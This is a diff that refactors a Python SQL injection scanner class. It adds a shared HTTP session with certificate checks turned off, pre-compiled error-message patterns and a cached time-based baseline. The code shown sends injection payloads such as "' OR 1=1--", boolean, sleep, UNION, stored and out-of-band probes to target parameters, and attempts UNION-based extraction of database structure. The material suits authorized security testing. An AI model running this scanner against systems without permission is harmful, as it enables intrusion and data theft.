@@ -28,6 +28,10 @@ class SQLInjectionTester:
         self.level = level
         self.vulnerabilities = []
         
+        # Use session for connection pooling
+        self.session = requests.Session()
+        self.session.verify = False
+        
         # SQL Injection Classification (as per provided diagram)
         self.sqli_types = {
             'in_band': ['error_based', 'union_based'],
@@ -316,7 +320,8 @@ class SQLInjectionTester:
         
         # Error patterns that indicate SQL injection - Made more specific to reduce false positives
         # Each pattern now requires more context to match
-        self.error_patterns = [
+        # Pre-compile regex patterns for performance
+        error_pattern_strings = [
             # MySQL specific - require MySQL context
             r"SQL syntax.*MySQL", r"Warning.*mysql_", r"valid MySQL result",
             r"MySqlClient\.", r"mysql_fetch_array\(\)", r"mysql_num_rows\(\)",
@@ -347,18 +352,23 @@ class SQLInjectionTester:
             r"Unknown column '[^']+' in 'where clause'",
             r"Table '[^']+' doesn't exist",
         ]
+        self.error_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in error_pattern_strings]
         
         # Patterns that are informational only (not confirmed vulns)
-        self.informational_patterns = [
+        informational_pattern_strings = [
             r"Syntax error",  # Too generic - could be JS error
             r"Data type mismatch",  # Could be form validation
             r"Conversion failed",  # Could be normal app behavior
             r"Division by zero",  # Could be math error
         ]
+        self.informational_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in informational_pattern_strings]
     
     def test_parameter(self, url, param, value, method='GET', waf_detected=None):
         """Test a specific parameter for SQL injection with WAF bypass support"""
         results = []
+        
+        # Cache baseline response time for this parameter to avoid redundant requests
+        baseline_time = None
         
         payloads_to_test = self.basic_payloads.copy()
         
@@ -375,7 +385,14 @@ class SQLInjectionTester:
             # Add ORDER BY enumeration payloads for column detection
             payloads_to_test.extend(self.order_by_payloads)
         
+        # Early exit counter - stop after finding a few vulnerabilities
+        max_vulns_per_param = 3 if self.level == 'normal' else 5
+        
         for payload in payloads_to_test:
+            # Early exit if we found enough vulnerabilities for this parameter
+            if len(results) >= max_vulns_per_param:
+                print(f"{Fore.YELLOW}[*] Found {len(results)} vulnerabilities for parameter '{param}', moving on...{Style.RESET_ALL}")
+                break
             # Test original payload first
             test_payloads = [payload]
             
@@ -389,10 +406,10 @@ class SQLInjectionTester:
                     # Prepare the test data
                     if method.upper() == 'GET':
                         test_params = {param: test_payload}
-                        response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                        response = self.session.get(url, params=test_params, timeout=self.timeout)
                     else:
                         test_data = {param: test_payload}
-                        response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
+                        response = self.session.post(url, data=test_data, timeout=self.timeout)
                     
                     # Check for SQL errors in response
                     # First, get a baseline response without payload to compare
@@ -400,8 +417,8 @@ class SQLInjectionTester:
                     matched_pattern = None
                     
                     for pattern in self.error_patterns:
-                        if re.search(pattern, response.text, re.IGNORECASE):
-                            matched_pattern = pattern
+                        if pattern.search(response.text):
+                            matched_pattern = pattern.pattern
                             found_error = True
                             break
                     
@@ -435,59 +452,53 @@ class SQLInjectionTester:
                         notify_vulnerability(vuln)  # Real-time notification
                         print(f"{Fore.RED}[!] SQL Injection found: {url} (param: {param}) [Confidence: {confidence}]{Style.RESET_ALL}")
                 
-                    # Time-based detection for sleep payloads - improved validation
+                    # Time-based detection for sleep payloads - improved validation with cached baseline
                     if any(sleep_keyword in test_payload.lower() for sleep_keyword in ['sleep', 'waitfor', 'pg_sleep', 'benchmark']):
+                        # Get baseline time if not already cached
+                        if baseline_time is None:
+                            start_baseline = time.time()
+                            try:
+                                if method.upper() == 'GET':
+                                    baseline_params = {param: 'test123'}
+                                    self.session.get(url, params=baseline_params, timeout=self.timeout)
+                                else:
+                                    baseline_data = {param: 'test123'}
+                                    self.session.post(url, data=baseline_data, timeout=self.timeout)
+                                baseline_time = time.time() - start_baseline
+                            except:
+                                baseline_time = 1.0  # Default baseline
+                        
                         start_time = time.time()
                         if method.upper() == 'GET':
                             test_params = {param: test_payload}
-                            response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                            response = self.session.get(url, params=test_params, timeout=self.timeout)
                         else:
                             test_data = {param: test_payload}
-                            response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
+                            response = self.session.post(url, data=test_data, timeout=self.timeout)
                         
                         response_time = time.time() - start_time
                         
-                        # Improved validation: response should take significantly longer than baseline
-                        # A 5-second sleep should result in 4+ second delay, but we also check
-                        # that normal requests are fast (to avoid false positives on slow servers)
-                        if response_time >= 4:
-                            # Verify with a second request to confirm it's not just a slow server
-                            start_verify = time.time()
-                            if method.upper() == 'GET':
-                                verify_params = {param: 'test123'}  # benign value
-                                try:
-                                    requests.get(url, params=verify_params, timeout=self.timeout, verify=False)
-                                except:
-                                    pass
-                            else:
-                                verify_data = {param: 'test123'}
-                                try:
-                                    requests.post(url, data=verify_data, timeout=self.timeout, verify=False)
-                                except:
-                                    pass
-                            baseline_time = time.time() - start_verify
-                            
-                            # Only report if the delay is significantly more than baseline
-                            if response_time > baseline_time + 3:
-                                vuln = {
-                                    'type': 'Time-based Blind SQL Injection',
-                                    'severity': 'High',
-                                    'confidence': 'High',
-                                    'url': url,
-                                    'parameter': param,
-                                    'payload': test_payload,
-                                    'method': method,
-                                    'evidence': f"Response delay: {response_time:.2f}s vs baseline: {baseline_time:.2f}s",
-                                    'response_time': response_time,
-                                    'baseline_time': baseline_time,
-                                    'status_code': response.status_code
-                                }
-                                results.append(vuln)
-                                notify_vulnerability(vuln)
-                                print(f"{Fore.RED}[!] Time-based SQL Injection CONFIRMED: {url} (param: {param}){Style.RESET_ALL}")
-                            else:
-                                # Server is just slow
-                                print(f"{Fore.YELLOW}[i] Slow response detected but baseline also slow - likely not SQLi{Style.RESET_ALL}")
+                        # Only report if the delay is significantly more than baseline (3+ seconds difference)
+                        if response_time >= 4 and response_time > baseline_time + 3:
+                            vuln = {
+                                'type': 'Time-based Blind SQL Injection',
+                                'severity': 'High',
+                                'confidence': 'High',
+                                'url': url,
+                                'parameter': param,
+                                'payload': test_payload,
+                                'method': method,
+                                'evidence': f"Response delay: {response_time:.2f}s vs baseline: {baseline_time:.2f}s",
+                                'response_time': response_time,
+                                'baseline_time': baseline_time,
+                                'status_code': response.status_code
+                            }
+                            results.append(vuln)
+                            notify_vulnerability(vuln)
+                            print(f"{Fore.RED}[!] Time-based SQL Injection CONFIRMED: {url} (param: {param}){Style.RESET_ALL}")
+                        elif response_time >= 4:
+                            # Server is just slow
+                            print(f"{Fore.YELLOW}[i] Slow response detected but baseline also slow - likely not SQLi{Style.RESET_ALL}")
                     
                         # Small delay to avoid overwhelming the server
                         time.sleep(0.1)
@@ -605,7 +616,7 @@ class SQLInjectionTester:
         
         try:
             # Test with a simple SQLi payload
-            response = requests.get(f"{url}?test=' OR 1=1--", timeout=self.timeout, verify=False)
+            response = self.session.get(f"{url}?test=' OR 1=1--", timeout=self.timeout)
             
             # Check headers for WAF signatures
             for waf_name, signatures in waf_signatures.items():
@@ -778,7 +789,7 @@ class SQLInjectionTester:
                 }
                 
                 start_time = time.time()
-                response = requests.get(url, params=test_params, timeout=self.timeout + 15, verify=False)
+                response = self.session.get(url, params=test_params, timeout=self.timeout + 15)
                 end_time = time.time()
                 response_time = end_time - start_time
                 
@@ -901,7 +912,7 @@ class SQLInjectionTester:
                     'ordering': 'ASC'
                 }
                 
-                response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                response = self.session.get(url, params=test_params, timeout=self.timeout)
                 
                 # If we get error 500, this version or higher is supported
                 # If we get success 200, this version is NOT supported
@@ -983,7 +994,7 @@ class SQLInjectionTester:
             for payload in payloads:
                 try:
                     test_params = {'test': payload}
-                    response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                     
                     # Check for database-specific indicators in response
                     response_text = response.text.lower()
@@ -1052,7 +1063,7 @@ class SQLInjectionTester:
             try:
                 test_params = {'test': payload}
                 start_time = time.time()
-                response = requests.get(url, params=test_params, timeout=self.timeout + 15, verify=False)
+                response = self.session.get(url, params=test_params, timeout=self.timeout + 15)
                 end_time = time.time()
                 response_time = end_time - start_time
                 
@@ -1228,10 +1239,10 @@ class SQLInjectionTester:
                     # Test the UNION-based information extraction
                     if method.upper() == 'GET':
                         test_params = {param: query}
-                        response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                        response = self.session.get(url, params=test_params, timeout=self.timeout)
                     else:
                         test_data = {param: query}
-                        response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
+                        response = self.session.post(url, data=test_data, timeout=self.timeout)
                     
                     # Look for database structure information in response
                     response_lower = response.text.lower()
@@ -1377,7 +1388,7 @@ class SQLInjectionTester:
                         store_data = {param: payload}
                         
                         # Try to store the payload via POST
-                        store_response = requests.post(test_url, data=store_data, timeout=self.timeout, verify=False)
+                        store_response = self.session.post(test_url, data=store_data, timeout=self.timeout)
                         
                         # Step 2: Try to trigger the stored payload by accessing profile/admin pages
                         trigger_endpoints = [
@@ -1393,7 +1404,7 @@ class SQLInjectionTester:
                             try:
                                 # Measure response time for time-based detection
                                 start_time = time.time()
-                                trigger_response = requests.get(trigger_url, timeout=self.timeout, verify=False)
+                                trigger_response = self.session.get(trigger_url, timeout=self.timeout)
                                 response_time = time.time() - start_time
                                 
                                 # Check for SQL errors in triggered response
@@ -1519,10 +1530,10 @@ class SQLInjectionTester:
             try:
                 if method.upper() == 'GET':
                     test_params = {param: order_by_payload}
-                    response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                 else:
                     test_data = {param: order_by_payload}
-                    response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
+                    response = self.session.post(url, data=test_data, timeout=self.timeout)
                 
                 # Check for ORDER BY specific error patterns
                 order_by_errors = [
@@ -1568,10 +1579,10 @@ class SQLInjectionTester:
                 try:
                     if method.upper() == 'GET':
                         test_params = {param: union_payload}
-                        response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                        response = self.session.get(url, params=test_params, timeout=self.timeout)
                     else:
                         test_data = {param: union_payload}
-                        response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
+                        response = self.session.post(url, data=test_data, timeout=self.timeout)
                     
                     # Check for UNION-specific error patterns
                     union_errors = [
@@ -1618,10 +1629,10 @@ class SQLInjectionTester:
                 try:
                     if method.upper() == 'GET':
                         test_params = {param: test_payload}
-                        response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                        response = self.session.get(url, params=test_params, timeout=self.timeout)
                     else:
                         test_data = {param: test_payload}
-                        response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
+                        response = self.session.post(url, data=test_data, timeout=self.timeout)
                     
                     # Check for string conversion errors
                     string_errors = [
@@ -1708,10 +1719,10 @@ class SQLInjectionTester:
                     try:
                         if method.upper() == 'GET':
                             test_params = {param: union_payload}
-                            response = requests.get(url, params=test_params, timeout=self.timeout, verify=False)
+                            response = self.session.get(url, params=test_params, timeout=self.timeout)
                         else:
                             test_data = {param: union_payload}
-                            response = requests.post(url, data=test_data, timeout=self.timeout, verify=False)
+                            response = self.session.post(url, data=test_data, timeout=self.timeout)
                         
                         # Look for signs of successful data extraction
                         success_indicators = {
@@ -1792,9 +1803,9 @@ class SQLInjectionTester:
         # Get baseline response
         try:
             if method.upper() == 'GET':
-                baseline_response = requests.get(url, params={param: 'normal_value'}, timeout=self.timeout, verify=False)
+                baseline_response = self.session.get(url, params={param: 'normal_value'}, timeout=self.timeout)
             else:
-                baseline_response = requests.post(url, data={param: 'normal_value'}, timeout=self.timeout, verify=False)
+                baseline_response = self.session.post(url, data={param: 'normal_value'}, timeout=self.timeout)
         except:
             return results
         
@@ -1818,11 +1829,11 @@ class SQLInjectionTester:
             try:
                 # Test TRUE vs FALSE conditions
                 if method.upper() == 'GET':
-                    true_response = requests.get(url, params={param: true_payload}, timeout=self.timeout, verify=False)
-                    false_response = requests.get(url, params={param: false_payload}, timeout=self.timeout, verify=False)
+                    true_response = self.session.get(url, params={param: true_payload}, timeout=self.timeout)
+                    false_response = self.session.get(url, params={param: false_payload}, timeout=self.timeout)
                 else:
-                    true_response = requests.post(url, data={param: true_payload}, timeout=self.timeout, verify=False)
-                    false_response = requests.post(url, data={param: false_payload}, timeout=self.timeout, verify=False)
+                    true_response = self.session.post(url, data={param: true_payload}, timeout=self.timeout)
+                    false_response = self.session.post(url, data={param: false_payload}, timeout=self.timeout)
                 
                 # Compare responses for differences
                 true_length = len(true_response.text)
@@ -1890,11 +1901,11 @@ class SQLInjectionTester:
         for error_payload, normal_payload in error_based_payloads:
             try:
                 if method.upper() == 'GET':
-                    error_response = requests.get(url, params={param: error_payload}, timeout=self.timeout, verify=False)
-                    normal_response = requests.get(url, params={param: normal_payload}, timeout=self.timeout, verify=False)
+                    error_response = self.session.get(url, params={param: error_payload}, timeout=self.timeout)
+                    normal_response = self.session.get(url, params={param: normal_payload}, timeout=self.timeout)
                 else:
-                    error_response = requests.post(url, data={param: error_payload}, timeout=self.timeout, verify=False)
-                    normal_response = requests.post(url, data={param: normal_payload}, timeout=self.timeout, verify=False)
+                    error_response = self.session.post(url, data={param: error_payload}, timeout=self.timeout)
+                    normal_response = self.session.post(url, data={param: normal_payload}, timeout=self.timeout)
                 
                 # Look for conditional error patterns
                 conditional_error_patterns = [
@@ -1965,17 +1976,17 @@ class SQLInjectionTester:
                 # Test normal payload first (baseline timing)
                 start_time = time.time()
                 if method.upper() == 'GET':
-                    normal_response = requests.get(url, params={param: normal_payload}, timeout=15, verify=False)
+                    normal_response = self.session.get(url, params={param: normal_payload}, timeout=15)
                 else:
-                    normal_response = requests.post(url, data={param: normal_payload}, timeout=15, verify=False)
+                    normal_response = self.session.post(url, data={param: normal_payload}, timeout=15)
                 normal_time = time.time() - start_time
                 
                 # Test delay payload
                 start_time = time.time()
                 if method.upper() == 'GET':
-                    delay_response = requests.get(url, params={param: delay_payload}, timeout=15, verify=False)
+                    delay_response = self.session.get(url, params={param: delay_payload}, timeout=15)
                 else:
-                    delay_response = requests.post(url, data={param: delay_payload}, timeout=15, verify=False)
+                    delay_response = self.session.post(url, data={param: delay_payload}, timeout=15)
                 delay_time = time.time() - start_time
                 
                 # Check for time-based blind SQLi (significant delay difference)
@@ -2047,9 +2058,9 @@ class SQLInjectionTester:
         for oast_payload in oast_payloads:
             try:
                 if method.upper() == 'GET':
-                    response = requests.get(url, params={param: oast_payload}, timeout=self.timeout, verify=False)
+                    response = self.session.get(url, params={param: oast_payload}, timeout=self.timeout)
                 else:
-                    response = requests.post(url, data={param: oast_payload}, timeout=self.timeout, verify=False)
+                    response = self.session.post(url, data={param: oast_payload}, timeout=self.timeout)
                 
                 vuln = {
                     'type': 'Out-of-Band (OAST) Blind SQL Injection',
@@ -2126,9 +2137,9 @@ class SQLInjectionTester:
         for payload in error_payloads:
             try:
                 if method.upper() == 'GET':
-                    response = requests.get(url, params={param: payload}, timeout=self.timeout, verify=False)
+                    response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                 else:
-                    response = requests.post(url, data={param: payload}, timeout=self.timeout, verify=False)
+                    response = self.session.post(url, data={param: payload}, timeout=self.timeout)
                 
                 # Check for database-specific error patterns
                 if self.check_error_patterns(response.text):
@@ -2180,9 +2191,9 @@ class SQLInjectionTester:
             for payload in union_payloads:
                 try:
                     if method.upper() == 'GET':
-                        response = requests.get(url, params={param: payload}, timeout=self.timeout, verify=False)
+                        response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                     else:
-                        response = requests.post(url, data={param: payload}, timeout=self.timeout, verify=False)
+                        response = self.session.post(url, data={param: payload}, timeout=self.timeout)
                     
                     # Check for successful UNION injection
                     if self.check_union_success(response.text, column_count):
@@ -2230,11 +2241,11 @@ class SQLInjectionTester:
         # Get baseline responses
         try:
             if method.upper() == 'GET':
-                true_response = requests.get(url, params={param: "' AND 1=1--"}, timeout=self.timeout, verify=False)
-                false_response = requests.get(url, params={param: "' AND 1=2--"}, timeout=self.timeout, verify=False)
+                true_response = self.session.get(url, params={param: "' AND 1=1--"}, timeout=self.timeout)
+                false_response = self.session.get(url, params={param: "' AND 1=2--"}, timeout=self.timeout)
             else:
-                true_response = requests.post(url, data={param: "' AND 1=1--"}, timeout=self.timeout, verify=False)
-                false_response = requests.post(url, data={param: "' AND 1=2--"}, timeout=self.timeout, verify=False)
+                true_response = self.session.post(url, data={param: "' AND 1=1--"}, timeout=self.timeout)
+                false_response = self.session.post(url, data={param: "' AND 1=2--"}, timeout=self.timeout)
             
             # Compare responses to detect boolean-based SQLi
             if self.compare_boolean_responses(true_response, false_response):
@@ -2276,9 +2287,9 @@ class SQLInjectionTester:
                 start_time = time.time()
                 
                 if method.upper() == 'GET':
-                    response = requests.get(url, params={param: payload}, timeout=self.timeout + 5, verify=False)
+                    response = self.session.get(url, params={param: payload}, timeout=self.timeout + 5)
                 else:
-                    response = requests.post(url, data={param: payload}, timeout=self.timeout + 5, verify=False)
+                    response = self.session.post(url, data={param: payload}, timeout=self.timeout + 5)
                 
                 response_time = time.time() - start_time
                 
@@ -2327,9 +2338,9 @@ class SQLInjectionTester:
             
             try:
                 if method.upper() == 'GET':
-                    response = requests.get(url, params={param: payload}, timeout=self.timeout, verify=False)
+                    response = self.session.get(url, params={param: payload}, timeout=self.timeout)
                 else:
-                    response = requests.post(url, data={param: payload}, timeout=self.timeout, verify=False)
+                    response = self.session.post(url, data={param: payload}, timeout=self.timeout)
                 
                 # If ORDER BY fails, we've found the column count
                 if self.check_error_patterns(response.text) or response.status_code >= 400:
